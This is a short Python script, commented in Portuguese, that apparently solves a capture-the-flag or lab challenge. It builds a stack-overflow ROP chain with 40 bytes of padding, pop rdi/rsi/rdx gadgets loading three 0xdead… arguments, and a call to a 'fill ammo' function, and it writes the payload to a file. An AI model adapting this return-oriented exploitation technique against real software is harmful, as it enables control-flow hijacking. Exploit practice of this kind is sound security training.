import struct
import sys

# Endereços dos gadgets
GADGET_POP_RDI = 0x40159f
GADGET_POP_RSI = 0x40159d
GADGET_POP_RDX = 0x40159b
GADGET_ALIGN   = 0x4011ef # nop

ADDR_FILL_AMMO = 0x4012f5

PARAM1 = 0xdeadbeef
PARAM2 = 0xdeadbabe
PARAM3 = 0xdead1337

# Empacotar em bytes usando little-endian
def p64(addr):
    return struct.pack("<Q", addr)

offset = 40
payload = b'A' * offset

payload += p64(GADGET_ALIGN)

payload += p64(GADGET_POP_RDI)
payload += p64(PARAM1)

payload += p64(GADGET_POP_RSI)
payload += p64(PARAM2)

payload += p64(GADGET_POP_RDX)
payload += p64(PARAM3)

payload += p64(ADDR_FILL_AMMO)

with open("payload.bin", "wb") as f:
    f.write(payload)